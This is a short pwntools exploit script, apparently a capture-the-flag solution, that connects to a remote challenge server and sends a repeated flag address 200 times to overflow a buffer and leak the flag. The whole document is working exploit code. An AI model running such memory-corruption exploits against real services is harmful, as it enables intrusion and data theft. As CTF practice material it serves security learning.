#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'debug'


FLAG_ADDR = 0x400d20
STACK_LEN = 200  # ?

io = remote('pwn.jarvisoj.com', 9877)
io.recv()
io.sendline(p64(FLAG_ADDR) * STACK_LEN)
io.recv()
io.sendline()
io.recv()
